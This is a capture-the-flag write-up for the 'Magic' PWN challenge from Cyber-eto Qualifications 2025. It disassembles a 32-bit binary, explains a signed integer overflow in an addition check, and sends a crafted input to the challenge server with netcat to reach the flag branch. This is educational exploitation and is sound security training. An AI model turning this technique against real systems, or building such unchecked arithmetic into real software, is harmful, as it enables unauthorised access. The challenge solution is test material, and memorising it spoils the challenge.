# Cyber-eto Qualifications 2025 - Magic - PWN Challenge

## Challenge Description
**Challenge Name:** Magic  
**Category:** PWN  
**Points:** [Points not specified]  
**Author:** [Author not specified]  

```
Magician?

> nc 161.97.155.116 1337
Enter the magic value  -->
01
This is not The Magic Value exiting %
```

## Initial Analysis

First, let's examine the binary:

```bash
$ file magic
magic: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a46942f2014d4d45b176964eb980befb89d62818, for GNU/Linux 3.2.0, not stripped
```

The binary is a 32-bit ELF executable that's not stripped, making our analysis easier.

Let's check the strings in the binary:

```bash
$ strings magic
Enter the magic value  --> 
You are a WayOff Try Again
How Did You Channnnnge me.... here is a prize for you : 
flag.txt
Failed to open flag file.
This is not The Magic Value exiting 
```

## Disassembly Analysis

Using `objdump -d magic`, we can analyze the main function. Key observations:

1. The program initializes a variable to 100 (0x64)
2. It prompts for user input with "Enter the magic value  --> "
3. Uses `scanf` to read an integer
4. If input is negative, it prints "You are a WayOff Try Again" and loops
5. When non-negative input is provided, it adds the input to 100
6. If the result is negative, it opens and reads flag.txt
7. Otherwise, it prints "This is not The Magic Value exiting"

## Vulnerability

The vulnerability lies in an **integer overflow**. Here's the relevant assembly:

```assembly
124c: c7 45 88 64 00 00 00    movl   $0x64,-0x78(%ebp)    ; Initialize sum = 100
...
12c3: 8b 45 84                mov    -0x7c(%ebp),%eax      ; Load user input
12c6: 01 45 88                add    %eax,-0x78(%ebp)      ; sum += input
12c9: 83 7d 88 00             cmpl   $0x0,-0x78(%ebp)     ; Compare sum with 0
12cd: 0f 89 8c 00 00 00       jns    135f <main+0x152>    ; Jump if sum >= 0
```

The program adds our input to 100 and checks if the result is negative. If it is, we get the flag!

## Exploitation

For a 32-bit signed integer:
- Maximum value: 2,147,483,647
- To cause overflow: we need `100 + input` to exceed this maximum
- Magic value: `2,147,483,647 - 100 + 1 = 2,147,483,548`

When we provide 2,147,483,548:
- Sum = 100 + 2,147,483,548 = 2,147,483,648
- This overflows to -2,147,483,648 (negative!)
- The condition `sum < 0` becomes true
- Flag is retrieved

## Solution

```bash
$ echo "2147483548" | nc 161.97.155.116 1337
Enter the magic value  --> How Did You Channnnnge me.... here is a prize for you : 
[FLAG_CONTENT]
```

## Flag

`[Flag would be displayed here]`

## Key Takeaways

1. **Integer Overflow**: Always consider integer overflow vulnerabilities in arithmetic operations
2. **32-bit vs 64-bit**: Understanding the target architecture is crucial for exploitation
3. **Signed Integer Behavior**: When signed integers overflow, they wrap around to negative values
4. **Static Analysis**: Disassembly revealed the exact logic and vulnerability without needing to run the binary

This challenge demonstrates a classic integer overflow vulnerability where insufficient input validation allows an attacker to manipulate program flow through arithmetic overflow.